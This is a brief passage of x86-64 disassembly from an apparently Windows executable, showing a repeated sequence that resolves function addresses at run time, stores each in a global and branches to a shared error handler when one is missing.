   1400052db:	ff 15 f7 5d 02 00    	call   *0x25df7(%rip)        # 0x14002b0d8
   1400052e1:	48 89 05 e8 ea 03 00 	mov    %rax,0x3eae8(%rip)        # 0x140043dd0
   1400052e8:	48 85 c0             	test   %rax,%rax
   1400052eb:	75 0c                	jne    0x1400052f9
   1400052ed:	4c 8d 05 b4 73 02 00 	lea    0x273b4(%rip),%r8        # 0x14002c6a8
   1400052f4:	e9 e0 fd ff ff       	jmp    0x1400050d9
   1400052f9:	48 8d 15 b8 73 02 00 	lea    0x273b8(%rip),%rdx        # 0x14002c6b8
   140005300:	48 8b cb             	mov    %rbx,%rcx
   140005303:	ff 15 cf 5d 02 00    	call   *0x25dcf(%rip)        # 0x14002b0d8
   140005309:	48 89 05 c8 ea 03 00 	mov    %rax,0x3eac8(%rip)        # 0x140043dd8
   140005310:	48 85 c0             	test   %rax,%rax
   140005313:	75 0c                	jne    0x140005321
   140005315:	4c 8d 05 9c 73 02 00 	lea    0x2739c(%rip),%r8        # 0x14002c6b8
   14000531c:	e9 b8 fd ff ff       	jmp    0x1400050d9
   140005321:	48 8d 15 a0 73 02 00 	lea    0x273a0(%rip),%rdx        # 0x14002c6c8
   140005328:	48 8b cb             	mov    %rbx,%rcx
   14000532b:	ff 15 a7 5d 02 00    	call   *0x25da7(%rip)        # 0x14002b0d8
   140005331:	48 89 05 a8 ea 03 00 	mov    %rax,0x3eaa8(%rip)        # 0x140043de0
   140005338:	48 85 c0             	test   %rax,%rax
   14000533b:	75 0c                	jne    0x140005349
   14000533d:	4c 8d 05 84 73 02 00 	lea    0x27384(%rip),%r8        # 0x14002c6c8
   140005344:	e9 90 fd ff ff       	jmp    0x1400050d9
   140005349:	48 8d 15 98 73 02 00 	lea    0x27398(%rip),%rdx        # 0x14002c6e8
   140005350:	48 8b cb             	mov    %rbx,%rcx
